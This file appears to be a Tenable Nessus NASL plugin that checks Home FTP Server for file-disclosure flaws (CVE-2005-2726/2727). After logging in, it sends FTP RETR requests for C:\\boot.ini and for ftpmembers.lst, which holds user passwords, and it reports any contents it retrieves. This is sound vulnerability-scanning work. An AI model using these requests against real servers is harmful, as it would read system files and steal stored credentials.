#
# (C) Tenable Network Security
#


include("compat.inc");

if (description) {
  script_id(19501);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2005-2726", "CVE-2005-2727");
  script_bugtraq_id(14653);
  script_xref(name:"OSVDB", value:"18968");
  script_xref(name:"OSVDB", value:"18969");

  script_name(english:"Home FTP Server Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by various information disclosure
issues." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running Home Ftp Server, an FTP server
application for Windows. 

The installed version of Home Ftp Server by default lets authenticated
users retrieve configuration files (which contain, for example, the
names and passwords of users defined to the application) as well as
arbitrary files on the remote system." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a5e13b3f" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2005-08/0814.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:S/C:P/I:N/A:N" );
script_end_attributes();

 
  summary["english"] = "Checks for multiple vulnerabilities in Home Ftp Server";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("find_service1.nasl", "ftp_overflow.nasl");
  script_require_keys("ftp/login", "ftp/password");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include('global_settings.inc');


# nb: to exploit the vulnerability we need to log in.
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");
if (!user || !pass) {
  exit(0, "ftp/login and/or ftp/password are empty");
}


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if (!soc) exit(0);
if (!ftp_authenticate(socket:soc, user:user, pass:pass)) {
  close(soc);
  exit(1, "cannot login with supplied FTP credentials");
}


# Make sure it looks like Home Ftp Server.
#
# nb: don't trust the banner since that's completely configurable.
c = string("SYST");
send(socket:soc, data:string(c, "\r\n"));
s = ftp_recv_line(socket:soc);
if ("UNIX Type: L8 Internet Component Suite" >!< s) {
  exit(0, "doesn't look like Home Ftp Server");
}


# Try to get boot.ini.
#
# nb: this may fail if another process is accessing the file.
port2 = ftp_pasv(socket:soc);
if (!port2) exit(0);
soc2 = open_sock_tcp(port2, transport:ENCAPS_IP);
if (!soc2) exit(0);

c = string("RETR C:\\boot.ini");
send(socket:soc, data:string(c, "\r\n"));
s = ftp_recv_line(socket:soc);
if (egrep(string:s, pattern:"^(425|150) ")) {
  file = ftp_recv_data(socket:soc2);

  # There's a problem if it looks like a boot.ini.
  if ("[boot loader]" >< file) {
    report = string(
      "Here are the contents of the file '\\boot.ini' that Nessus\n",
      "was able to read from the remote host :\n",
      "\n",
      file
    );
    security_warning(port:port, extra:report);
    vuln = 1;
  }
}
close(soc2);


if (thorough_tests && isnull(vuln)) {
  # Try to retrieve the list of users.
  port2 = ftp_pasv(socket:soc);
  if (!port2) exit(0);
  soc2 = open_sock_tcp(port2, transport:ENCAPS_IP);
  if (!soc2) exit(0);

  c = string("RETR ftpmembers.lst");
  send(socket:soc, data:string(c, "\r\n"));
  s = ftp_recv_line(socket:soc);
  if (egrep(string:s, pattern:"^(425|150) ")) {
    file = ftp_recv_data(socket:soc2);

    # There's a problem if it looks like the member's list.
    if ("[ftpmembers]" >< file && "pass=" >< file) {
      report = string(
        "Here are the contents of the file 'ftpmembers.lst' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        file
      );
      security_warning(port:port, extra:report);
    }
  }
  close(soc2);
}

# Close the connections.
ftp_close(socket:soc);
